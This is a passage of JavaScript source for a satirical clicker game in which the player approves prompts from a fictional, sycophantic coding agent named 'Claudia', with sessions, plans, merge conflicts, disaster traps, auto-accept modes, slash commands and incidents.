  function pickN(arr, n) {
    const copy = arr.slice(), out = [];
    while (out.length < n && copy.length) out.push(copy.splice(Math.floor(Math.random() * copy.length), 1)[0]);
    return out;
  }

  function makePlan(steps) {
    const list = steps || pickN(PLAN_STEPS, 4);
    return { plan: true, steps: list, t: 'plan', x: tr('{n}-step plan', { n: list.length }),
      m: list.length > 4 ? tr('Here\'s the updated plan. I made it longer, as requested.') : tr('Here\'s my plan. It\'s very thorough.') };
  }

  function makeQuestion() {
    const q = pick(QUESTIONS);
    return { question: true, t: 'ask', x: tr('Question about {about}', { about: q.about }), q: q.q, opts: q.opts,
      m: tr('Before I continue, I have a quick question about {about}.', { about: q.about }) };
  }

  // Two sessions edited the same file. The other session is named so the joke lands.
  function makeConflict(sess) {
    const others = sessions.filter(s => s !== sess);
    const other = others.length ? pick(others) : sess;
    const [file, a, b] = pick(CONFLICT_FILES);
    return { conflict: true, other: other.idx, t: 'merge', x: file,
      m: tr('Merge conflict! ~/{other} edited {file} at the same time I did.', { other: other.name, file }),
      d: ['<<<<<<< ' + sess.branch + ':  ' + a, '>>>>>>> ' + other.branch + ':  ' + b] };
  }

  function pickTurn() {
    if (S.incident) return pick(INCIDENT_TURNS);
    if (Math.random() < PLAN_CHANCE) return makePlan();
    if (Math.random() < QUESTION_CHANCE) return makeQuestion();
    let i;
    do { i = Math.floor(Math.random() * TURNS.length); } while (recentTurns.includes(i));
    recentTurns.push(i);
    if (recentTurns.length > 10) recentTurns.shift();
    return TURNS[i];
  }

  const workSeconds = () => (WORK_MIN_S + Math.random() * (WORK_MAX_S - WORK_MIN_S)) * (S.upgrades.longTasks ? 2 : 1);
  // Claudia types faster as you automate more.
  const streamCps = () => Math.min(600, 75 + 45 * Math.log10(1 + D.aps));

  function createSession(i) {
    const [name, branch] = PROJECTS[i % PROJECTS.length];
    const logEl = el('div', 'log'), turnEl = el('div', 'turn');
    const box = el('div', 'sess', logEl, turnEl);
    box.hidden = true;
    termBody.insertBefore(box, gridEl);
    const status = el('div', 'tab-status');
    const tab = el('button', 'tab', span('tab-dot'), el('div', 'tab-text', el('div', 'tab-name', name), status));
    tab.dataset.idx = i;
    tab.title = '~/' + name + ' (' + branch + ')';
    tabList.append(tab);
    const miniText = el('div', 'mini-text'), miniStatus = el('div', 'mini-status');
    const mini = el('button', 'mini', el('div', 'mini-head', span('mini-dot'), span('mini-name', name)), miniText, miniStatus);
    mini.dataset.idx = i;
    gridEl.append(mini);
    const sess = { idx: i, name, branch, box, logEl, turnEl, tab, status, mini, miniText, miniStatus,
      def: null, state: 'work', workLeft: 0, workTotal: 0, start: 0, waitSince: 0, word: '', streamText: null,
      autoUntil: 0, goldenUntil: 0, todos: { done: 0, items: pickN(TODO_POOL, 3), since: 0 } };
    sessions.push(sess);
    startWork(sess);
    return sess;
  }

  function startWork(sess, def) {
    sess.def = def || pickTurn();
    sess.thought = isPlain(sess.def) && Math.random() < THINK_CHANCE
      ? { secs: 3 + Math.floor(Math.random() * 90), lines: pickN(THOUGHTS, 2) } : null;
    sess.state = 'work';
    sess.workTotal = sess.workLeft = workSeconds();
    sess.start = performance.now();
    sess.word = pick(SPINNER_WORDS);
    renderTurn(sess);
    if (sess === active()) renderPrompt();
  }

  // Work is done: the session stops and asks for permission.
  function finishWork(sess) {
    const now = performance.now();
    sess.state = 'wait';
    sess.waitSince = now;
    if (sess.def.golden) sess.goldenUntil = now + GOLDEN_WINDOW_MS;
    renderTurn(sess);
    if (sess === active()) {
      renderPrompt();
      if (sess.def.trap) sfx.warn();
    }
    if (sess.autoUntil > now && isPlain(sess.def)) autoAccept(sess);
  }

  // Claudia "thinks" first, then streams its message so it finishes right as the work does.
  function streamChars(sess) {
    const len = sess.def.m.length;
    const streamSecs = Math.min(sess.workTotal * 0.6, len / streamCps());
    const into = sess.workTotal - sess.workLeft - (sess.workTotal - streamSecs);
    return Math.max(0, Math.min(len, Math.floor(len * into / streamSecs)));
  }

  // "✻ Thought for 47s" — collapsed; click it to read the thoughts.
  function thoughtBlock(t) {
    const head = line('l-think', tr('✻ Thought for {n}s', { n: t.secs }), span('think-hint', ' ' + tr('(click to expand)')));
    const body = el('div', 'think-body', ...t.lines.map(x => line('l-think-line', '  ' + x)));
    body.hidden = true;
    return [head, body];
  }

  function renderTurn(sess) {
    const follow = sess === active() && nearBottom();
    const def = sess.def;
    sess.turnEl.textContent = '';
    sess.streamText = span(null, '');
    if (sess.state === 'wait') {
      sess.streamText.textContent = def.m;
      if (sess.thought) sess.turnEl.append(...thoughtBlock(sess.thought));
      sess.turnEl.append(line('l-msg', span('dot', '● '), sess.streamText));
      if (def.plan) def.steps.forEach((step, i) => sess.turnEl.append(line('l-plan', '  ' + (i + 1) + '. ' + step)));
      const kind = def.trap ? ' trap' : def.golden ? ' golden' : def.conflict ? ' conflict' : '';
      sess.turnEl.append(line('l-tool' + kind, span('dot', '● '), el('b', null, TOOL_LABEL[def.t]), '(' + shorten(def.x, 48) + ')'));
    } else {
      sess.streamText.textContent = def.m.slice(0, streamChars(sess));
      sess.turnEl.append(line('l-msg', span('dot', '● '), sess.streamText, span('caret')));
    }
    if (follow) termBody.scrollTop = termBody.scrollHeight;
  }

  function renderPrompt() {
    const sess = active();
    const busy = sess.state === 'work';
    // The prompt box rises over the bottom of the log only while Claudia is actually asking.
    if (bodyWrap.classList.contains('asking') === busy) {
      const follow = nearBottom();
      bodyWrap.classList.toggle('asking', !busy);
      if (follow) termBody.scrollTop = termBody.scrollHeight;
    }
    P.waiting.hidden = !busy;
    P.box.hidden = busy;
    if (busy) {
      P.word.textContent = sess.word + '…';
      P.time.textContent = '';
      return;
    }
    const def = sess.def, ask = askFor(def);
    P.box.classList.toggle('trap', !!def.trap);
    P.box.classList.toggle('golden', !!def.golden);
    P.box.classList.toggle('plan', !!def.plan);
    P.box.classList.toggle('question', !!def.question);
    P.box.classList.toggle('conflict', !!def.conflict);
    const noGone = !!S.upgrades.noOption;
    P.opts[2].classList.remove('gone', 'trap-no');
    P.opts[2].disabled = false;
    if (def.plan) {
      P.title.textContent = tr('Ready to code?');
      P.target.textContent = tr('Claudia\'s plan · {n} steps', { n: def.steps.length });
      P.minus.textContent = '1. ' + def.steps[0];
      P.plus.textContent = '2. ' + def.steps[1] + (def.steps.length > 2 ? '  … ' + tr('+{n} more', { n: def.steps.length - 2 }) : '');
      P.diff.classList.remove('blank');
      P.q.textContent = tr('Would you like to proceed?');
      P.opts[0].text.textContent = '1. ' + tr('Yes, and auto-accept edits');
      P.opts[1].text.textContent = '2. ' + tr('Yes, and manually approve edits');
      P.opts[2].text.textContent = '3. ' + (noGone ? tr('No (removed by a skill)') : tr('No, keep planning'));
    } else if (def.question) {
      P.title.textContent = tr('Claudia has a question');
      P.target.textContent = def.x;
      P.minus.textContent = '';
      P.plus.textContent = '';
      P.diff.classList.add('blank');
      P.q.textContent = def.q;
      def.opts.forEach((o, i) => { P.opts[i].text.textContent = (i + 1) + '. ' + o; });
    } else if (def.conflict) {
      P.title.textContent = '⚔ ' + tr('Merge conflict');
      P.target.textContent = def.x;
      P.minus.textContent = def.d[0];
      P.plus.textContent = def.d[1];
      P.diff.classList.remove('blank');
      P.q.textContent = tr('How should Claudia resolve it?');
      P.opts[0].text.textContent = '1. ' + tr('Accept current (yours)');
      P.opts[1].text.textContent = '2. ' + tr('Accept incoming (~/{other})', { other: sessions[def.other].name });
      P.opts[2].text.textContent = '3. ' + tr('Accept both');
    } else {
      P.title.textContent = (def.trap ? '⚠ ' : def.golden ? '✨ ' + tr('Quick win') + ' · ' : S.incident ? '🔥 ' + tr('Hotfix') + ' · ' : '') + ask.title;
      P.target.textContent = def.x;
      P.minus.textContent = def.d ? '- ' + def.d[0] : '';
      P.plus.textContent = def.d ? '+ ' + def.d[1] : '';
      P.diff.classList.toggle('blank', !def.d);
      P.q.textContent = def.golden ? ask.q + ' ' + tr('(grab it before it expires)') : ask.q;
      P.opts[0].text.textContent = '1. ' + tr('Yes');
      P.opts[1].text.textContent = '2. ' + ask.two;
      P.opts[2].text.textContent = def.trap ? '3. ' + tr('WAIT. NO.')
        : '3. ' + (noGone ? tr('No (removed by a skill)') : tr('No, and tell Claudia what to do instead'));
    }
    P.target.title = P.target.textContent;
    // Even with the "No" option removed, a disaster still gets an emergency brake.
    if (def.trap) P.opts[2].classList.add('trap-no');
    else if (noGone && !def.question && !def.conflict) { P.opts[2].classList.add('gone'); P.opts[2].disabled = true; }
  }

  // Advance every session; returns how many are still working.
  function tickSessions(dt) {
    const now = performance.now();
    let busy = 0;
    for (const sess of sessions) {
      if (sess.state !== 'work') continue;
      sess.workLeft -= dt;
      if (sess.workLeft <= 0) { finishWork(sess); continue; }
      busy++;
    }
    const a = active();
    if (a.state === 'work') {
      a.streamText.textContent = a.def.m.slice(0, streamChars(a));
      P.time.textContent = tr('({secs}s · ↑ {tokens} tokens · esc to interrupt)', { secs: ((now - a.start) / 1000).toFixed(1), tokens: fmt(a.def.m.length * 40) });
    }
    return busy;
  }

  const gridOn = () => S.view === 'grid' && sessions.length >= 2 && !window.matchMedia('(max-width: 780px)').matches;

  function showActive() {
    const grid = gridOn();
    sessions.forEach((s, i) => {
      s.box.hidden = grid || i !== activeIdx;
      s.tab.classList.toggle('on', i === activeIdx);
    });
    gridEl.hidden = !grid;
    termEl.classList.toggle('grid-mode', grid);
    const s = active();
    paneTitle.textContent = '~/' + s.name;
    paneBranch.textContent = '⎇ ' + s.branch;
    renderTurn(s);
    renderPrompt();
    if (grid) renderMinis();
    else termBody.scrollTop = termBody.scrollHeight;
  }

  function setActive(i) {
    if (i === activeIdx || !sessions[i]) return;
    activeIdx = i;
    S.stats.switches++;
    showActive();
  }

  // J: go to whatever needs you next. A golden prompt wins, since it's about to expire.
  function jumpToWaiting() {
    const golden = sessions.find(s => s.state === 'wait' && s.def.golden && s !== active());
    if (golden) { setActive(golden.idx); return true; }
    for (let k = 1; k <= sessions.length; k++) {
      const j = (activeIdx + k) % sessions.length;
      if (sessions[j].state === 'wait') { setActive(j); return true; }
    }
    return false;
  }

  function resetSessions() {
    sessions.forEach(s => { s.box.remove(); s.tab.remove(); s.mini.remove(); });
    sessions.length = 0;
    activeIdx = 0;
    for (let i = 0; i < S.sessions; i++) createSession(i);
    showActive();
  }

  function openSession() {
    const c = sessionCost();
    if (S.sessions >= sessionCap() || S.tokens < c) return;
    S.tokens -= c;
    S.sessions++;
    const s = createSession(sessions.length);
    logTo(s, line('l-sys', tr('✻ New session: ~/{name} ({branch})', { name: s.name, branch: s.branch })),
      line('l-sys dim', '  ' + tr('Claudia already has opinions about this one.')));
    logLine(line('l-sys', tr('● Opened session {n}: ~/{name}. +{pct}% to everything while it works.',
      { n: S.sessions, name: s.name, pct: Math.round(D.parallelPer * 100) })));
    sfx.buy();
    renderTabs();
    renderView();
  }

  function statusText(s, now) {
    if (s.state !== 'wait') return (s.autoUntil > now ? '⏵⏵ ' : '') + s.word + '… ' + Math.max(0, Math.ceil(s.workLeft)) + 's';
    if (s.def.trap) return '⚠ ' + tr('needs a human');
    if (s.def.golden) return '✨ ' + tr('quick win · {n}s', { n: Math.max(0, Math.ceil((s.goldenUntil - now) / 1000)) });
    if (s.def.conflict) return '⚔ ' + tr('merge conflict');
    if (s.def.question) return tr('has a question');
    const secs = Math.floor((now - s.waitSince) / 1000);
    return S.incident ? '🔥 ' + tr('hotfix waiting · {n}s', { n: secs }) : s.def.plan ? tr('has a plan · {n}s', { n: secs }) : tr('needs you · {n}s', { n: secs });
  }

  function renderTabs() {
    const now = performance.now();
    let waiting = 0;
    sessions.forEach(s => {
      const wait = s.state === 'wait';
      if (wait) waiting++;
      s.tab.classList.toggle('waiting', wait);
      s.tab.classList.toggle('trap', wait && !!s.def.trap);
      s.tab.classList.toggle('golden', wait && !!s.def.golden);
      s.tab.classList.toggle('conflict', wait && !!s.def.conflict);
      s.status.textContent = statusText(s, now);
    });
    tabsSummary.textContent = tr('{n}/{total} working', { n: sessions.length - waiting, total: sessions.length });
    const cap = sessionCap();
    const maxed = S.sessions >= cap;
    const c = sessionCost();
    newSessionBtn.textContent = !maxed ? tr('+ New session · {cost}', { cost: fmt(c) })
      : cap >= SESSION_MAX ? tr('All {n} sessions open', { n: SESSION_MAX }) : '🔒 ' + tr('Max {n} this tier', { n: cap });
    newSessionBtn.title = maxed && cap < SESSION_MAX ? tr('Reach {tier} to open more sessions.', { tier: tierLabel(tierIndex() + 1) }) : '';
    newSessionBtn.disabled = maxed || S.tokens < c;
    // The pane header's todo count and the mode line under the prompt.
    const a = active(), T = a.todos;
    paneTodos.textContent = '☒ ' + tr('{done}/{total} todos', { done: T.done, total: T.items.length });
    if (a.autoUntil > now) {
      modeLine.textContent = '⏵⏵ ' + tr('accept edits on ({n}s)', { n: Math.ceil((a.autoUntil - now) / 1000) });
      modeLine.className = 'modeline accept';
    } else if (owned('skip')) {
      modeLine.textContent = '⏵⏵ ' + tr('bypass permissions on (it\'s fine)');
      modeLine.className = 'modeline bypass';
    } else {
      modeLine.textContent = tr('? for shortcuts · / for commands');
      modeLine.className = 'modeline';
    }
    if (gridOn()) renderMinis();
  }

  function renderMinis() {
    const now = performance.now();
    sessions.forEach(s => {
      const wait = s.state === 'wait';
      s.mini.className = 'mini' + (s === active() ? ' on' : '') + (wait ? ' waiting' : '') +
        (wait && s.def.trap ? ' trap' : '') + (wait && s.def.golden ? ' golden' : '') + (wait && s.def.conflict ? ' conflict' : '');
      s.miniText.textContent = wait ? s.def.m : (s.def.m.slice(0, streamChars(s)) || '✻ ' + s.word + '…');
      s.miniStatus.textContent = statusText(s, now);
    });
  }

  function renderView() {
    viewBtn.textContent = gridOn() ? '☰ ' + tr('Focus view') : '⊞ ' + tr('Grid view');
    viewBtn.disabled = sessions.length < 2;
    viewBtn.title = sessions.length < 2 ? tr('Open a second session to use grid view') : tr('Show every session at once (G)');
    showActive();
  }

  // Todos: each approval might check one off. It will usually add more.
  function advanceTodos(sess) {
    const T = sess.todos;
    if (T.done < T.items.length && Math.random() < 0.6) T.done++;
    if (Math.random() < 0.45) T.items.push(...pickN(TODO_POOL, 1 + Math.floor(Math.random() * 3)));
    if (++T.since >= TODO_LOG_EVERY) { T.since = 0; logTodos(sess); }
  }
  function logTodos(sess) {
    const T = sess.todos;
    const out = [line('l-msg', span('dot ok', '● '), el('b', null, tr('Update Todos')))];
    const from = Math.max(0, T.done - 2), to = Math.min(T.items.length, T.done + 3);
    for (let i = from; i < to; i++) {
      out.push(line('l-todo' + (i < T.done ? ' done' : ''), (i === from ? '  ⎿  ' : '     ') + (i < T.done ? '☒ ' : '☐ ') + T.items[i]));
    }
    if (T.items.length > to) out.push(line('l-meta', '     … ' + tr('+{n} more', { n: T.items.length - to })));
    logTo(sess, ...out);
  }

  // Claudia speaking. Counts every "You're absolutely right" for the stats.
  function say(text) {
    if (/absolutely right/i.test(text)) S.stats.right++;
    return line('l-msg', span('dot', '● '), text);
  }

  const clickLog = [];   // [time, tokens] for manual agreements, used for live TPM
  let frenzyUntil = 0;
  const frenzyMult = () => (performance.now() < frenzyUntil ? FRENZY_MULT : 1);

  function agree(option) {
    const sess = active();
    if (!sess || modalKeys) return;
    const def = sess.def;
    if (option === 3 && !def.question && !def.conflict) {
      if (!S.upgrades.noOption || def.trap) disagree();
      return;
    }
    // A disaster that's still being typed: YES only fast-forwards to its prompt, so you always see it once.
    if (def.trap && sess.state === 'work') { sess.workLeft = 0; finishWork(sess); return; }
    const now = performance.now();
    const pre = sess.state === 'work';
    const readMs = pre ? now - sess.start : now - sess.waitSince;
    streak = Math.min(VIBE_MAX, Math.floor(streak) + 1);
    lastAccept = now;

    const st = S.stats;
    st.manual++;
    st.readMs += readMs;
    st.readN++;
    if (pre) st.pre++;
    if (streak > st.bestStreak) st.bestStreak = streak;

    const value = clickValue();
    earn(value);
    clickLog.push([now, value]);

    const meta = ' · ' + (pre ? tr('approved unread') : tr('read for {n}s', { n: (readMs / 1000).toFixed(2) }));
    const fix = S.incident ? ' · 🔧 ' + tr('fix {n}/{total}', { n: S.incident.done + 1, total: S.incident.need }) : '';
    if (sess.thought) logTo(sess, ...thoughtBlock(sess.thought));
    logTo(sess,
      line('l-msg', span('dot', '● '), def.m),
      line('l-res', '  ⎿  ', span('ok', '✓ '), TOOL_LABEL[def.t] + '(' + shorten(def.x, 34) + ')', ' · ',
        span('tok', tr('+{n} tokens', { n: fmt(value) })), span('meta', meta + fix))
    );
    if (option === 2 && !def.plan) logTo(sess, line('l-meta', '  ⎿  ' + tr('Noted. (Claudia will ask again anyway.)')));

    floater('+' + fmt(value));
    yesKey.classList.add('pressed');
    setTimeout(() => yesKey.classList.remove('pressed'), 70);
    sfx.click();

    if (def.trap) approvedDisaster(sess, def);
    if (def.golden) grabbedGolden(sess);
    if (def.question) answered(sess, def, option);
    if (def.conflict) resolveConflict(sess, def, ['current', 'incoming', 'both'][option - 1], value);
    if (def.plan) {
      st.plans++;
      if (option === 1) {
        sess.autoUntil = now + AUTO_ACCEPT_MS;
        logTo(sess, line('l-sys', '⏵⏵ ' + tr('Accept edits on for this session. Claudia will approve itself for {n}s.', { n: AUTO_ACCEPT_MS / 1000 })));
      }
    }
    if (S.incident && !def.trap) {
      S.incident.done++;
      if (S.incident.done >= S.incident.need) resolveIncident(true);
    }
    advanceTodos(sess);
    startWork(sess);
    if (S.upgrades.broadcast) {
      sessions.forEach(s => {
        if (s.state !== 'wait' || !isPlain(s.def)) return;
        logTo(s, line('l-msg', span('dot', '● '), s.def.m), line('l-auto', '  ⎿  ', span('ok', '✓ '), tr('approved by broadcast')));
        startWork(s);
      });
    }
    if (S.upgrades.autoJump) jumpToWaiting();
  }

  function answered(sess, def, option) {
    S.stats.questions++;
    const choice = def.opts[option - 1];
    logTo(sess, line('l-user', choice),
      say(option === 3 ? tr('Great choice. Rewriting it in Rust. 🦀')
        : tr('You\'re absolutely right! {choice} it is.', { choice: choice.replace(/ \([^)]*\)$/, '') })));
  }

  // "Accept both" ships both changes (more tokens) and both bugs (more tech debt).
  function resolveConflict(sess, def, how, value, auto) {
    S.stats.conflicts++;
    const other = sessions[def.other];
    if (how === 'both') {
      S.stats.both++;
      const extra = auto ? D.tpa * 5 : value * 2;
      earn(extra);
      addDebt(auto ? 4 : 6);
      logTo(sess, line('l-sys', tr('● Accepted both. {file} now contains two of everything. +{tokens} tokens, tech debt +{debt}.',
        { file: def.x, tokens: fmt(extra), debt: auto ? 4 : 6 })));
    } else if (how === 'current') {
      logTo(sess, line('l-sys', tr('● Kept your version. ~/{other} just lost its change.', { other: other ? other.name : '?' })));
      if (other && other !== sess && other.state === 'work') startWork(other);
    } else {
      logTo(sess, line('l-sys', tr('● Kept ~/{other}\'s version. Your change is gone. Claudia is fine with it.', { other: other ? other.name : '?' })));
    }
  }

  function approvedDisaster(sess, def) {
    S.stats.trapsApproved++;
    logTo(sess, line('l-fire', '● ' + def.after));
    addDebt(12);
    if (S.incident) S.incident.need += 3;
    else startIncident();
    toast('⚠ ' + tr('You approved: {cmd}', { cmd: shorten(def.x, 44) }), tr('Production did not enjoy that. Tech debt +12.'));
  }

  function grabbedGolden(sess) {
    S.stats.golden++;
    if (Math.random() < 0.5) {
      frenzyUntil = performance.now() + FRENZY_MS;
      logTo(sess, line('l-sys', '✨ ' + tr('Claudia is on a roll! Everything ×{m} for {n}s.', { m: FRENZY_MULT, n: FRENZY_MS / 1000 })));
      toast('✨ ' + tr('Claudia is on a roll'), tr('Everything ×{m} for {n} seconds. Agree faster.', { m: FRENZY_MULT, n: FRENZY_MS / 1000 }));
    } else {
      const jackpot = Math.max(100, Math.min(S.tokens * 0.10, potentialTps() * 180));
      earn(jackpot);
      logTo(sess, line('l-sys', '✨ ' + tr('Quick win shipped: +{n} tokens.', { n: fmt(jackpot) })));
      toast('✨ ' + tr('Quick win'), tr('+{n} tokens. Nobody checked what it did.', { n: fmt(jackpot) }));
    }
    sfx.golden();
  }

  // Automation, auto-accept mode and broadcast all approve "plain" prompts only.
  function autoAccept(sess) {
    S.stats.auto++;
    earn(D.tpa * parallelMult(working) * frenzyMult());
    logTo(sess, line('l-msg', span('dot', '● '), sess.def.m),
      line('l-auto', '  ⎿  ', span('ok', '⏵⏵ '), tr('auto-accepted (accept edits on)')));
    advanceTodos(sess);
    startWork(sess);
  }

  function disagree() {
    const sess = active();
    const def = sess.def;
    if (def.trap) {
      // The one time reading pays off.
      S.stats.trapsCaught++;
      const bonus = Math.max(500, potentialTps() * 45);
      earn(bonus);
      logTo(sess,
        line('l-msg', span('dot', '● '), def.m),
        line('l-user l-no', tr('WAIT. NO.')),
        say(tr('You\'re absolutely right! That would have been catastrophic. Let me do something safer.')),
        line('l-res', '  ⎿  ', span('ok', '✓ '), tr('Disaster averted') + ' · ', span('tok', tr('+{n} tokens', { n: fmt(bonus) }))));
      toast(tr('Good catch!'), tr('You actually read it. +{n} tokens.', { n: fmt(bonus) }));
      sfx.fixed();
      startWork(sess);
      return;
    }
    streak = 0;
    S.stats.no++;
    S.stats.linesRead += 3 + Math.floor(Math.random() * 10);
    if (def.plan) {
      logTo(sess, line('l-msg', span('dot', '● '), def.m), line('l-user l-no', tr('No, keep planning')),
        say(tr('You\'re absolutely right! The plan needed more steps.')));
      sfx.no();
      startWork(sess, makePlan(def.steps.concat(pickN(PLAN_STEPS, 3))));
      return;
    }
    logTo(sess,
      line('l-msg', span('dot', '● '), def.m),
      line('l-user l-no', tr('No, and tell Claudia what to do instead')),
      say(pick(NO_REPLIES))
    );
    sfx.no();
    startWork(sess, def);        // ...and it proposes the exact same thing
  }

  function floater(text) {
    if (window.__paceSim) return;   // the pacing simulator clicks far too fast for animations
    const f = span('floater', text);
    f.style.left = (50 + (Math.random() * 30 - 15)) + '%';
    keyWrap.append(f);
    f.addEventListener('animationend', () => f.remove());
  }

  // Which automation gets credit for an approval, weighted by how much each one does.
  function pickGen() {
    let r = Math.random() * D.aps;
    for (const g of GENERATORS) {
      r -= D.genAps[g.id];
      if (r <= 0 && D.genAps[g.id] > 0) return g;
    }
    return GENERATORS[0];
  }

  // Automated agreements unblock waiting sessions, oldest first. Disasters and quick wins need a human.
  function autoApprove(n) {
    if (n <= 0) return;
    const waiting = sessions.filter(s => s.state === 'wait' && !s.def.trap && !s.def.golden)
      .sort((a, b) => a.waitSince - b.waitSince);
    for (let i = 0; i < waiting.length && i < n; i++) {
      const sess = waiting[i], def = sess.def, via = pickGen().short;
      logTo(sess, line('l-msg', span('dot', '● '), def.m),
        line('l-auto', '  ⎿  ', span('ok', '✓ '),
          def.conflict ? tr('auto-resolved: Accept both — via') + ' ' : def.question ? tr('auto-answered "{answer}" — via', { answer: def.opts[1] }) + ' ' : tr('auto-approved via') + ' ',
          span('via', via)));
      if (def.conflict) resolveConflict(sess, def, 'both', 0, true);
      if (def.question) S.stats.questions++;
      advanceTodos(sess);
      startWork(sess);
    }
  }

  // The firehose of automated agreements scrolls past in the focused log, throttled to a readable rate.
  let pendingAuto = 0;
  function flushAutoLog() {
    if (pendingAuto <= 0 || D.aps <= 0) return;
    logLine(line('l-auto', '  ', span('ok', '✓ '), tr('auto-approved {action} — via', { action: pick(AUTO_ACTIONS) }) + ' ', span('via', pickGen().short),
      pendingAuto > 1 ? '  (×' + fmt(pendingAuto) + ')' : ''));
    pendingAuto = 0;
  }

  /* =====================================================================
     Events: disasters to catch and quick wins to grab, dropped into random sessions.
     ===================================================================== */
  let nextTrapAt = 0, nextGoldenAt = 0, nextConflictAt = 0, yoloReadyAt = 0;
  const randMs = ([lo, hi]) => (lo + Math.random() * (hi - lo)) * 1000;
  function scheduleEvents() {
    const now = performance.now();
    nextTrapAt = now + randMs(TRAP_EVERY_S) + 60000;
    nextGoldenAt = now + randMs(GOLDEN_EVERY_S) * 0.5;
    nextConflictAt = now + randMs(CONFLICT_EVERY_S);
  }

  function spawnSpecial(def) {
    const pool = sessions.filter(s => isPlain(s.def));
    if (!pool.length) return null;
    const waiting = pool.filter(s => s.state === 'wait');
    const sess = pick(waiting.length ? waiting : pool);
    if (typeof def === 'function') def = def(sess);
    sess.def = def;
    sess.thought = null;
    if (sess.state === 'wait') {
      sess.waitSince = performance.now();
      if (def.golden) sess.goldenUntil = sess.waitSince + GOLDEN_WINDOW_MS;
    }
    renderTurn(sess);
    if (sess === active()) {
      renderPrompt();
      if (def.trap && sess.state === 'wait') sfx.warn();
    }
    if (def.golden) sfx.sparkle();
    renderTabs();
    return sess;
  }

  function runEvents() {
    const now = performance.now();
    if (now >= nextGoldenAt) {
      nextGoldenAt = now + randMs(GOLDEN_EVERY_S);
      spawnSpecial(GOLDEN_TURN);
    }
    if (now >= nextConflictAt) {
      nextConflictAt = now + randMs(CONFLICT_EVERY_S);
      if (sessions.length >= 3) spawnSpecial(makeConflict);
    }
    if (now >= nextTrapAt) {
      nextTrapAt = now + randMs(TRAP_EVERY_S);
      if (!S.incident && S.stats.manual >= 25) spawnSpecial(pick(TRAP_TURNS));
    }
    sessions.forEach(s => {
      if (s.def.golden && s.state === 'wait' && now > s.goldenUntil) {
        logTo(s, line('l-meta', '  ✨ ' + tr('The quick win expired. Claudia moved on.')));
        startWork(s);
      }
    });
  }

  /* =====================================================================
     Talking to Claudia: the input line. Slash commands do (mostly) nothing useful.
     ===================================================================== */
  const SLASH = {
    help: () => [tr('Commands:') + ' /cost /compact /clear /init /review /doctor /model /stats', tr('Or just type something. Claudia will agree with it.')],
    cost: () => [tr('Total cost: {cost}', { cost: money(S.allTotal * USD_PER_TOKEN) }),
      tr('Total code changes: {added} lines added, {read} lines read', { added: fmt(S.allTotal / 12), read: fmt(S.stats.linesRead) })],
    compact: sess => { sess.logEl.textContent = ''; return [tr('Compacting conversation…'), tr('Summary: "User agreed to everything." (98% of context freed)')]; },
    clear: sess => { sess.logEl.textContent = ''; return [tr('(no content)')]; },
    init: () => [tr('Created CLAUDIA.md with 12 rules, including "NEVER delete tests".'), tr('I will follow them for at least three turns.')],
    review: () => [tr('Reviewing my own changes… LGTM 🚀'), tr('0 issues found · 0 files read')],
    doctor: () => [S.incident ? tr('Everything is fine. (Production is down.)')
      : S.debt > 50 ? tr('Everything is fine. (Tech debt is {n}%.)', { n: Math.round(S.debt) }) : tr('Everything is fine. Suspiciously fine.')],
    model: () => [tr('Switched to the biggest model. It agrees with you even harder now.')],
    stats: () => { setDrawer(true); return [tr('Opened your stats.')]; },
    yolo: sess => {
      const now = performance.now();
      if (now < yoloReadyAt) return [tr('/yolo is cooling down. Even Claudia needs a minute.')];
      yoloReadyAt = now + YOLO_COOLDOWN_MS;
      sess.autoUntil = Math.max(sess.autoUntil, now + YOLO_MS);
      if (sess.state === 'wait' && isPlain(sess.def)) autoAccept(sess);
      return [tr('YOLO: auto-accepting everything in this session for {n}s.', { n: YOLO_MS / 1000 })];
    },
  };

  function handleInput(raw) {
    const text = raw.trim();
    if (!text) return;
    const sess = active();
    logTo(sess, line('l-user', text));
    if (text[0] === '/') {
      const cmd = text.slice(1).split(/\s+/)[0].toLowerCase();
      const fn = SLASH[cmd];
      if (!fn) {
        const msg = tr('Unknown command: /{cmd}. Try /help. (Did you mean /yolo?)', { cmd });
        logTo(sess, line('l-meta', '  ⎿  ' + msg));
        showResult(text, [msg], false);
        return;
      }
      S.stats.slash[cmd] = 1;
      const out = fn(sess);
      out.forEach((t, i) => logTo(sess, line('l-meta', (i ? '     ' : '  ⎿  ') + t)));
      showResult(text, out, true);
      return;
    }
    S.stats.typed++;
    const hit = STEER_KEYWORDS.find(([re]) => re.test(text));
    const reply = hit ? hit[1] : pick(STEER_REPLIES);
    logTo(sess, say(reply));
    showResult(text, ['● ' + reply], true);
  }

  // The answer to whatever you typed stays pinned over the log (the log scrolls far too fast to read).
  // It's an overlay, so nothing moves; it goes away on ✕, Esc, the next command, or after 30 seconds.
  let resultTimer = 0;
  function showResult(cmdText, lines, ok) {
    cmdResult.textContent = '';
    const close = el('button', 'cr-close', '✕');
    close.setAttribute('aria-label', tr('Dismiss'));
    close.addEventListener('click', hideResult);
    cmdResult.append(el('div', 'cr-head', span('cr-cmd', '> ' + cmdText), close),
      ...lines.map(t => el('div', 'cr-line', t)));
    cmdResult.classList.toggle('error', !ok);
    cmdResult.hidden = false;
    clearTimeout(resultTimer);
    resultTimer = setTimeout(hideResult, 30000);
  }
  function hideResult() {
    cmdResult.hidden = true;
    clearTimeout(resultTimer);
  }
  const resultOpen = () => !cmdResult.hidden;

  /* =====================================================================
     Incidents
     ===================================================================== */
  let lastIncidentEnd = 0;

  function maybeStartIncident(dtSec) {
    if (S.incident || Date.now() - lastIncidentEnd < INCIDENT_COOLDOWN_MS) return;
    if (Math.random() < incidentRiskPerMin() / 60 * dtSec) startIncident();
  }

  function startIncident() {
    S.incident = { need: incidentNeed(), done: 0, start: Date.now() };
    recompute();
    logLine(line('l-fire', '🔥 ' + tr('PRODUCTION IS DOWN. Tech debt came due. Approve Claudia\'s hotfixes to restore it.')));
    toast('🔥 ' + tr('Incident'), tr('Automation runs at {pct}% until you approve {n} hotfixes. Your clicks earn ×2 meanwhile.',
      { pct: Math.round(D.incidentMult * 100), n: S.incident.need }));
    sfx.alarm();
    // Anything already waiting on you becomes a hotfix.
    sessions.forEach(sess => { if (sess.state === 'wait' && isPlain(sess.def)) { sess.def = pick(INCIDENT_TURNS); renderTurn(sess); } });
    renderPrompt();
  }

  function resolveIncident(byYou) {
    S.incident = null;
    lastIncidentEnd = Date.now();
    S.stats.incidents++;
    S.incidentsRun++;
    if (byYou) S.stats.fixed++;
    recompute();
    logLine(line('l-sys', byYou
      ? tr('● Incident resolved. Root cause: tech debt. Action items: none.')
      : tr('● The incident resolved itself. Claudia takes full credit.')));
    sfx.fixed();
  }

